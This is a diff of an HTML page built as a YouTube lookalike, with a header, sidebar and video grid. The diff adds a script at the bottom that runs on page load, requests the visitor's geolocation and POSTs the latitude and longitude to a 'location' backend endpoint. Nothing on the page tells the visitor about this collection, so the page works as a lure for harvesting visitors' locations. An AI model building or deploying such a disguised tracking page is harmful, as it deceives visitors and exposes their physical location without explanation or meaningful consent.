@@ -4,115 +4,431 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube</title>
-    <link rel="stylesheet" href="style.css">
+    <title>YouTube Clone</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            background-color: #0f0f0f;
+            color: white;
+        }
+
+        /* Header Styles */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 56px;
+            background-color: #0f0f0f;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            z-index: 100;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            color: white;
+            padding: 8px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .menu-btn:hover {
+            background-color: #272727;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .youtube-icon {
+            color: #ff0000;
+        }
+
+        .logo span {
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .search-bar {
+            flex: 1;
+            max-width: 640px;
+            margin: 0 16px;
+            display: flex;
+        }
+
+        .search-bar input {
+            flex: 1;
+            padding: 8px 16px;
+            font-size: 16px;
+            border: 1px solid #303030;
+            border-radius: 20px 0 0 20px;
+            background-color: #121212;
+            color: white;
+            outline: none;
+        }
+
+        .search-bar input:focus {
+            border-color: #1c62b9;
+        }
+
+        .search-bar button {
+            padding: 0 24px;
+            background-color: #222222;
+            border: 1px solid #303030;
+            border-left: none;
+            border-radius: 0 20px 20px 0;
+            color: white;
+            cursor: pointer;
+        }
+
+        .search-bar button:hover {
+            background-color: #272727;
+        }
+
+        .header-right {
+            display: flex;
+            gap: 16px;
+        }
+
+        .header-right button {
+            background: none;
+            border: none;
+            color: white;
+            padding: 8px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .header-right button:hover {
+            background-color: #272727;
+        }
+
+        /* Sidebar Styles */
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 56px;
+            bottom: 0;
+            width: 240px;
+            background-color: #0f0f0f;
+            padding: 8px;
+            overflow-y: auto;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+            padding: 8px 12px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .nav-item:hover {
+            background-color: #272727;
+        }
+
+        .nav-item span {
+            font-size: 14px;
+        }
+
+        /* Main Content Styles */
+        main {
+            margin-left: 240px;
+            margin-top: 56px;
+            padding: 24px 16px;
+        }
+
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 16px;
+        }
+
+        .video-card {
+            cursor: pointer;
+        }
+
+        .video-card img {
+            width: 100%;
+            aspect-ratio: 16/9;
+            object-fit: cover;
+            border-radius: 12px;
+        }
+
+        .video-info {
+            padding: 12px 4px;
+        }
+
+        .video-info h3 {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .channel {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 4px;
+        }
+
+        .stats {
+            font-size: 14px;
+            color: #aaa;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 1200px) {
+            .video-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        @media (max-width: 880px) {
+            .video-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                display: none;
+            }
+
+            main {
+                margin-left: 0;
+            }
+
+            .search-bar {
+                display: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .video-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
 </head>
 
 <body>
-    <!-- Main Wrapper -->
-    <div class="wrapper">
-
-        <!-- Sidebar -->
-        <nav class="sidebar">
-            <div class="sidebar-item logo">
-                <h1>YouTube</h1>
+    <header>
+        <div class="header-left">
+            <button class="menu-btn">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="4" x2="20" y1="12" y2="12" />
+                    <line x1="4" x2="20" y1="6" y2="6" />
+                    <line x1="4" x2="20" y1="18" y2="18" />
+                </svg>
+            </button>
+            <div class="logo">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round" class="youtube-icon">
+                    <path
+                        d="M2.5 17a24.12 24.12 0 0 1 0-10 2 2 0 0 1 1.4-1.4 49.56 49.56 0 0 1 16.2 0A2 2 0 0 1 21.5 7a24.12 24.12 0 0 1 0 10 2 2 0 0 1-1.4 1.4 49.55 49.55 0 0 1-16.2 0A2 2 0 0 1 2.5 17" />
+                    <path d="m10 15 5-3-5-3z" />
+                </svg>
+                <span>YouTube</span>
             </div>
-            <div class="sidebar-item">
-                <a href="#">Home</a>
-            </div>
-            <div class="sidebar-item">
-                <a href="#">Trending</a>
-            </div>
-            <div class="sidebar-item">
-                <a href="#">Subscriptions</a>
-            </div>
-            <div class="sidebar-item">
-                <a href="#">Library</a>
-            </div>
-            <div class="sidebar-item">
-                <a href="#">History</a>
-            </div>
-            <div class="sidebar-item">
-                <a href="#">Your Videos</a>
-            </div>
-            <div class="sidebar-item">
-                <a href="#">Watch Later</a>
-            </div>
-        </nav>
-
-        <!-- Main Content -->
-        <div class="main-content">
-
-            <!-- Header -->
-            <header class="header">
-                <div class="header-left">
-                    <button class="menu-toggle">
-                        <span>&#9776;</span>
-                    </button>
-                    <input type="text" class="search-bar" placeholder="Search">
-                </div>
-                <div class="header-right">
-                    <img src="https://via.placeholder.com/40" alt="User" class="user-icon">
-                </div>
-            </header>
-
-            <!-- Video Grid -->
-            <div class="video-grid">
-                <div class="video-card">
-                    <img src="https://via.placeholder.com/300x170" alt="Video Thumbnail">
-                    <div class="video-info">
-                        <h3>Video Title</h3>
-                        <p>Channel Name</p>
-                        <p>1M views • 2 days ago</p>
-                    </div>
-                </div>
-                <div class="video-card">
-                    <img src="https://via.placeholder.com/300x170" alt="Video Thumbnail">
-                    <div class="video-info">
-                        <h3>Video Title</h3>
-                        <p>Channel Name</p>
-                        <p>2M views • 5 days ago</p>
-                    </div>
-                </div>
-                <div class="video-card">
-                    <img src="https://via.placeholder.com/300x170" alt="Video Thumbnail">
-                    <div class="video-info">
-                        <h3>Video Title</h3>
-                        <p>Channel Name</p>
-                        <p>500K views • 1 week ago</p>
-                    </div>
-                </div>
-                <div class="video-card">
-                    <img src="https://via.placeholder.com/300x170" alt="Video Thumbnail">
-                    <div class="video-info">
-                        <h3>Video Title</h3>
-                        <p>Channel Name</p>
-                        <p>10K views • 3 hours ago</p>
-                    </div>
-                </div>
-                <div class="video-card">
-                    <img src="https://via.placeholder.com/300x170" alt="Video Thumbnail">
-                    <div class="video-info">
-                        <h3>Video Title</h3>
-                        <p>Channel Name</p>
-                        <p>8M views • 1 month ago</p>
-                    </div>
-                </div>
-                <div class="video-card">
-                    <img src="https://via.placeholder.com/300x170" alt="Video Thumbnail">
-                    <div class="video-info">
-                        <h3>Video Title</h3>
-                        <p>Channel Name</p>
-                        <p>3M views • 2 weeks ago</p>
-                    </div>
-                </div>
-            </div>
-
         </div>
 
-    </div>
+        <div class="search-bar">
+            <input type="text" placeholder="Search">
+            <button>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="11" cy="11" r="8" />
+                    <path d="m21 21-4.3-4.3" />
+                </svg>
+            </button>
+        </div>
 
-    <script src="script.js"></script>
+        <div class="header-right">
+            <button>
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9" />
+                    <path d="M10.3 21a1.94 1.94 0 0 0 3.4 0" />
+                </svg>
+            </button>
+            <button>
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10" />
+                    <circle cx="12" cy="10" r="3" />
+                    <path d="M7 20.662V19a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v1.662" />
+                </svg>
+            </button>
+        </div>
+    </header>
+
+    <nav class="sidebar">
+        <div class="nav-item">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
+                <polyline points="9 22 9 12 15 12 15 22" />
+            </svg>
+            <span>Home</span>
+        </div>
+        <div class="nav-item">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10" />
+                <polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76" />
+            </svg>
+            <span>Explore</span>
+        </div>
+        <div class="nav-item">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect width="18" height="18" x="3" y="3" rx="2" />
+                <path d="m9 8 6 4-6 4Z" />
+            </svg>
+            <span>Subscriptions</span>
+        </div>
+        <div class="nav-item">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10" />
+                <polyline points="12 6 12 12 16 14" />
+            </svg>
+            <span>History</span>
+        </div>
+        <div class="nav-item">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M7 10v12" />
+                <path
+                    d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2h0a3.13 3.13 0 0 1 3 3.88Z" />
+            </svg>
+            <span>Liked Videos</span>
+        </div>
+        <div class="nav-item">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect width="18" height="18" x="3" y="3" rx="2" />
+                <path d="M12 8v8" />
+                <path d="M8 12h8" />
+            </svg>
+            <span>Your Videos</span>
+        </div>
+    </nav>
+
+    <main>
+        <div class="video-grid">
+            <div class="video-card">
+                <img src="https://images.unsplash.com/photo-1611162616475-46b635cb6868?w=500&q=80"
+                    alt="Video thumbnail">
+                <div class="video-info">
+                    <h3>Learning Web Development in 2024 - Complete Guide</h3>
+                    <p class="channel">Code Masters</p>
+                    <p class="stats">120K views • 2 days ago</p>
+                </div>
+            </div>
+            <div class="video-card">
+                <img src="https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=500&q=80"
+                    alt="Video thumbnail">
+                <div class="video-info">
+                    <h3>Web Development Tips & Tricks</h3>
+                    <p class="channel">Tech Insights</p>
+                    <p class="stats">85K views • 1 week ago</p>
+                </div>
+            </div>
+            <div class="video-card">
+                <img src="https://images.unsplash.com/photo-1516116216624-53e697fedbea?w=500&q=80"
+                    alt="Video thumbnail">
+                <div class="video-info">
+                    <h3>Modern CSS Techniques</h3>
+                    <p class="channel">Design Hub</p>
+                    <p class="stats">200K views • 3 days ago</p>
+                </div>
+            </div>
+            <div class="video-card">
+                <img src="https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=500&q=80"
+                    alt="Video thumbnail">
+                <div class="video-info">
+                    <h3>JavaScript Essential Concepts</h3>
+                    <p class="channel">JS Mastery</p>
+                    <p class="stats">150K views • 5 days ago</p>
+                </div>
+            </div>
+        </div>
+    </main>
+    <script>// Function to get the user's location
+        async function getLocation() {
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                    });
+                    showPosition(position);
+                } catch (error) {
+                    console.log(error);
+                }
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Display position (Latitude and Longitude)
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Send the location to the backend (using async/await)
+            sendLocationToBackend(latitude, longitude);
+        }
+
+        // Send location to backend using async/await
+        async function sendLocationToBackend(latitude, longitude) {
+            try {
+                const response = await fetch('location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ latitude, longitude })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+
+                const data = await response.json();
+                console.log('Location stored successfully:', data);
+            } catch (error) {
+                console.error('Error storing location:', error);
+            }
+        }
+
+        // Trigger the function to get the location
+        window.onload = getLocation;
+    </script>
 </body>
 
 </html>
